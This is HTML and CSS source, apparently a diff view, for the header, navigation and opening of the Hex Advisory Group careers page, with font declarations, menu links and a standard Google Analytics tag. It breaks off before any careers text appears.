format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-style:italic;font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QoFqPfE.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-style:italic;font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4Q4FqPfE.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-style:italic;font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4TYFq.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-style:italic;font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QIFqPfE.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-style:italic;font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4SYFqPfE.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-style:italic;font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QoFqPfE.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-style:italic;font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4Q4FqPfE.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-style:italic;font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4TYFq.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-style:italic;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QIFqPfE.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-style:italic;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4SYFqPfE.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-style:italic;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QoFqPfE.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-style:italic;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4Q4FqPfE.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-style:italic;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4TYFq.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-style:italic;font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QIFqPfE.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-style:italic;font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4SYFqPfE.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-style:italic;font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QoFqPfE.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-style:italic;font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4Q4FqPfE.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-style:italic;font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4TYFq.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-style:italic;font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QIFqPfE.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-style:italic;font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4SYFqPfE.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-style:italic;font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4QoFqPfE.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-style:italic;font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4Q4FqPfE.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-style:italic;font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2023/02/1Ptsg8zYS_SKggPNyCg4TYFq.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCAIT5lu.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCkIT5lu.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCIIT5lu.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCMIT5lu.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-weight:100;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyC0ITw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCAIT5lu.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCkIT5lu.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCIIT5lu.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCMIT5lu.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-weight:300;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyC0ITw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCAIT5lu.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCkIT5lu.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCIIT5lu.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCMIT5lu.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyC0ITw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCAIT5lu.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCkIT5lu.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCIIT5lu.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCMIT5lu.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-weight:500;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyC0ITw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}@font-face{font-family:'Raleway';font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCAIT5lu.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Raleway';font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCkIT5lu.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Raleway';font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCIIT5lu.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Raleway';font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyCMIT5lu.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Raleway';font-weight:900;font-display:swap;src:url(https://hexadvisory.com/wp-content/uploads/2022/07/1Ptug8zYS_SKggPNyC0ITw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}</style><link rel="preload" fetchpriority="high" href="https://hexadvisory.com/wp-content/uploads/themify-concate/1247724868/themify-3141319173.css" as="style"><link fetchpriority="high" id="themify_concate-css" rel="stylesheet" href="https://hexadvisory.com/wp-content/uploads/themify-concate/1247724868/themify-3141319173.css"><link rel="preconnect" href="https://www.google-analytics.com">			<style type="text/css">
+					.is-form-id-3519 .is-search-submit:focus,
+			.is-form-id-3519 .is-search-submit:hover,
+			.is-form-id-3519 .is-search-submit,
+            .is-form-id-3519 .is-search-icon {
+			color: #ffffff !important;            background-color: #c5ac2e !important;            border-color: #c5ac2e !important;			}
+                        	.is-form-id-3519 .is-search-submit path {
+					fill: #ffffff !important;            	}
+            			</style>
+		</head>
+<body class="wp-singular page-template-default page page-id-2893 wp-theme-themify-ultra wp-child-theme-themify-ultra-child themify-ultra skin-foundation sidebar-none full_width no-home tb_animation_on ready-view header-horizontal fixed-header-enabled transparent-header footer-none tagline-off social-widget-off search-off footer-off footer-widgets-off footer-menu-navigation-off header-widgets-off sidemenu-active">
+<a class="screen-reader-text skip-to-content" href="#content">Skip to content</a><svg id="tf_svg" style="display:none"><defs><symbol id="tf-ti-arrow-down" viewBox="0 0 32 32"><path d="M29.81 16.69 28.5 15.3 16.94 26.88v-25h-1.88v25L3.5 15.3l-1.31 1.4 13.8 13.81z"/></symbol></defs></svg><script> </script><noscript><iframe data-no-script src="https://www.googletagmanager.com/ns.html?id=GTM-G-EELNZCD2EX" height="0" width="0" style="display:none"></iframe></noscript><script async data-no-optimize="1" data-noptimize="1" data-cfasync="false" data-ga="G-EELNZCD2EX" src="data:text/javascript;base64,KGE9PntmdW5jdGlvbiBlKCl7YS5kYXRhTGF5ZXIucHVzaChhcmd1bWVudHMpfWEuZGF0YUxheWVyPWEuZGF0YUxheWVyfHxbXSxlKCJqcyIsbmV3IERhdGUpLGUoImNvbmZpZyIsZG9jdW1lbnQuY3VycmVudFNjcmlwdC5kYXRhc2V0LmdhKSxlKCJldmVudCIsInBhZ2VfdmlldyIpfSkod2luZG93KTs="></script><script async data-no-optimize="1" data-noptimize="1" data-cfasync="false" src="https://www.googletagmanager.com/gtag/js?id=G-EELNZCD2EX"></script><div id="pagewrap" class="tf_box hfeed site">
+					<div id="headerwrap"  class=' tf_box'>
+
+			
+			                                                    <div class="header-icons tf_hide">
+                                <a id="menu-icon" class="tf_inline_b tf_text_dec" href="#mobile-menu" aria-label="Menu"><span class="menu-icon-inner tf_inline_b tf_vmiddle tf_overflow"></span><span class="screen-reader-text">Menu</span></a>
+				                            </div>
+                        
+			<header id="header" class="tf_box pagewidth tf_clearfix" itemscope="itemscope" itemtype="https://schema.org/WPHeader">
+
+	            
+	            <div class="header-bar tf_box">
+				    <div id="site-logo"><a href="https://hexadvisory.com" title="Hex Advisory Group"><img  src="https://hexadvisory.com/wp-content/uploads/2026/01/HEX-Logo-2026.png" alt="Hex Advisory Group" class="site-logo-image" width="130" height="65" data-tf-not-load="1" fetchpriority="high"></a></div>				</div>
+				<!-- /.header-bar -->
+
+									<div id="mobile-menu" class="sidemenu sidemenu-off tf_scrollbar">
+												
+						<div class="navbar-wrapper tf_clearfix">
+                            														
+							
+							
+							<nav id="main-nav-wrap" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement">
+								<ul id="main-nav" class="main-nav tf_clearfix tf_box"><li  id="menu-item-26" class="menu-item-page-22 menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-26"><a  href="https://hexadvisory.com/">Home</a> </li>
+<li  id="menu-item-575" class="menu-item-page-484 menu-item menu-item-type-post_type menu-item-object-page menu-item-575"><a  href="https://hexadvisory.com/about/">Who We Are</a> </li>
+<li  id="menu-item-6668" class="menu-item-custom-6668 menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children has-sub-menu menu-item-6668" aria-haspopup="true"><a  href="#">Who We Serve<span class="child-arrow"></span></a> <ul class="sub-menu"><li  id="menu-item-7447" class="menu-item-custom-7447 menu-item menu-item-type-custom menu-item-object-custom menu-item-7447 menu-custom-7447-parent-6668"><a  href="https://hexadvisory.com/enterprises/#more">Enterprises</a> </li>
+<li  id="menu-item-7448" class="menu-item-custom-7448 menu-item menu-item-type-custom menu-item-object-custom menu-item-7448 menu-custom-7448-parent-6668"><a  href="https://hexadvisory.com/private-equity/#more">Private Equity</a> </li>
+<li  id="menu-item-7449" class="menu-item-custom-7449 menu-item menu-item-type-custom menu-item-object-custom menu-item-7449 menu-custom-7449-parent-6668"><a  href="https://hexadvisory.com/management-consultants/#more">Management Consultants</a> </li>
+<li  id="menu-item-7450" class="menu-item-custom-7450 menu-item menu-item-type-custom menu-item-object-custom menu-item-7450 menu-custom-7450-parent-6668"><a  href="https://hexadvisory.com/global-capability-center/#more">GCC</a> </li>
+</ul></li>
+<li  id="menu-item-28" class="menu-item-custom-28 menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children has-sub-menu menu-item-28" aria-haspopup="true"><a  href="#">What We Do<span class="child-arrow"></span></a> <ul class="sub-menu"><li  id="menu-item-2741" class="menu-item-page-2482 menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children has-sub-menu menu-item-2741 menu-page-2482-parent-28" aria-haspopup="true"><a  href="https://hexadvisory.com/services/">Services<span class="child-arrow"></span></a> <ul class="sub-menu"><li  id="menu-item-3313" class="menu-item-custom-3313 menu-item menu-item-type-custom menu-item-object-custom menu-item-3313 menu-custom-3313-parent-2741"><a  href="https://hexadvisory.com/cost-run-optimization/#more">Sourcing / Shoring Strategy</a> </li>
+<li  id="menu-item-3314" class="menu-item-custom-3314 menu-item menu-item-type-custom menu-item-object-custom menu-item-3314 menu-custom-3314-parent-2741"><a  href="https://hexadvisory.com/fairness-opinion-services/#more">Proposal Review / Contract Health Check</a> </li>
+<li  id="menu-item-3317" class="menu-item-custom-3317 menu-item menu-item-type-custom menu-item-object-custom menu-item-3317 menu-custom-3317-parent-2741"><a  href="https://hexadvisory.com/program-effectiveness/#more">Program Effectiveness</a> </li>
+<li  id="menu-item-7424" class="menu-item-custom-7424 menu-item menu-item-type-custom menu-item-object-custom menu-item-7424 menu-custom-7424-parent-2741"><a  href="https://hexadvisory.com/vmoaas/#more">VMOaaS</a> </li>
+</ul></li>
+<li  id="menu-item-6666" class="menu-item-custom-6666 menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children has-sub-menu menu-item-6666 menu-custom-6666-parent-28" aria-haspopup="true"><a  href="#">Products<span class="child-arrow"></span></a> <ul class="sub-menu"><li  id="menu-item-3320" class="menu-item-custom-3320 menu-item menu-item-type-custom menu-item-object-custom menu-item-3320 menu-custom-3320-parent-6666"><a  href="https://hexadvisory.com/hex-index/#more">HEX <span style="color: #d8bc10;">Index</span><sup>®</sup></a> </li>
+<li  id="menu-item-7451" class="menu-item-custom-7451 menu-item menu-item-type-custom menu-item-object-custom menu-item-7451 menu-custom-7451-parent-6666"><a  href="https://hexadvisory.com/hex-index-marketplace/#more">HEX <span style="color: #d8bc10;">Index</span><sup>®</sup> Marketplace</a> </li>
+<li  id="menu-item-3321" class="menu-item-custom-3321 menu-item menu-item-type-custom menu-item-object-custom menu-item-3321 menu-custom-3321-parent-6666"><a  href="https://hexadvisory.com/contract-analytics/#more">Contract Analytics</a> </li>
+</ul></li>
+</ul></li>
+<li  id="menu-item-2777" class="menu-item-custom-2777 menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children mega has-mega-sub-menu has-mega has-sub-menu menu-item-2777" aria-haspopup="true"><a  href="https://hexadvisory.com/blog/category/perspectives/">Perspectives<span class="child-arrow"></span></a> <div class="mega-sub-menu sub-menu tf_scrollbar"><ul class="tf_mega_taxes tf_left tf_box"><li  id="menu-item-2778" class="menu-item-category-4 menu-item menu-item-type-taxonomy menu-item-object-category mega-sub-item mega-link menu-item-2778 menu-category-4-parent-2777" data-termid="4" data-tax="category"><a  href="https://hexadvisory.com/blog/category/perspectives/">Latest Posts</a> </li>
+</ul></div></li>
+<li  id="menu-item-5487" class="menu-item-custom-5487 menu-item menu-item-type-custom menu-item-object-custom menu-item-5487"><a  target="_blank" rel="noopener" href="https://www.hexindex.io">HEX <span style="color: #d8bc10;">Index</span><sup>®</sup> Login</a> </li>
+</ul>							</nav>
+							<!-- /#main-nav-wrap -->
+                                                    </div>
+
+						
+							<a id="menu-icon-close" aria-label="Close menu" class="tf_close tf_hide" href="#"><span class="screen-reader-text">Close Menu</span></a>
+
+																	</div><!-- #mobile-menu -->
+                     					<!-- /#mobile-menu -->
+				
+				
+				
+			</header>
+			<!-- /#header -->
+				        
+		</div>
+		<!-- /#headerwrap -->
+	
+	<div id="body" class="tf_box tf_clear tf_mw tf_clearfix">
+		
+	<!-- layout-container -->
+<div id="layout" class="pagewidth tf_box tf_clearfix">
+        <!-- content -->
+    <main id="content" class="tf_box tf_clearfix">
+	                <div id="page-2893" class="type-page">
+                            <div class="page-content entry-content">
+            <!--themify_builder_content-->
+<div id="themify_builder_content-2893" data-postid="2893" class="themify_builder_content themify_builder_content-2893 themify_builder tf_clear">
+                    <div  data-css_id="79e2030" data-lazy="1" class="module_row themify_builder_row fullheight fullwidth tb_79e2030 tb_first tf_w">
+                        <div class="row_inner col_align_top tb_col_count_1 tf_box tf_rel">
+                        <div  data-lazy="1" class="module_column tb-column col-full tb_0vae067 first">
+                            <div  data-lazy="1" class="module_subrow themify_builder_sub_row tf_w col_align_top tb_col_count_1 tb_2946030">
+                <div  data-lazy="1" class="module_column sub_column col-full tb_9man383 first">
+                    <!-- module plain text -->
+<div  class="module module-plain-text tb_pt3x660  wow" data-tf-animation="fadeInUp" data-lazy="1">
+        <div class="tb_text_wrap">
+    <h1><span style="font-weight: 900;">C</span><span style="font-weight: 400;">areers</span></h1>    </div>
+</div>
+<!-- /module plain text --><!-- module icon -->
+<div  class="module module-icon tb_glix030  xlarge  icon_horizontal tf_textc wow" data-tf-animation="fadeInDown" data-lazy="1">
+			<div class="module-icon-item">
+							<a href="https://hexadvisory.com/careers/#mail">
+																	<em class="tf_box"
+																	><svg  class="tf_fa tf-ti-arrow-down" aria-hidden="true"><use href="#tf-ti-arrow-down"></use></svg></em>
+																</a>
+					</div>
+	</div>
+<!-- /module icon -->
+        </div>
+                    </div>
+                </div>
+                        </div>
+        </div>
+                        <div  data-anchor="mail" data-lazy="1" class="module_row themify_builder_row tb_has_section tb_section-mail tb_1ocp16 tf_w">
+                        <div class="row_inner col_align_top tb_col_count_1 tf_box tf_rel">
+                        <div  data-lazy="1" class="module_column tb-column col-full tb_rnle16 first">
+                            <div  data-lazy="1" class="module_subrow themify_builder_sub_row tf_w col_align_top tb_col_count_1 tb_y5pe88">
+                <div  data-lazy="1" class="module_column sub_column col-full tb_nnw288 first">
+                    <!-- module text -->
+<div  class="module module-text tb_nf4x28   " data-lazy="1">
+        <div  class="tb_text_wrap">
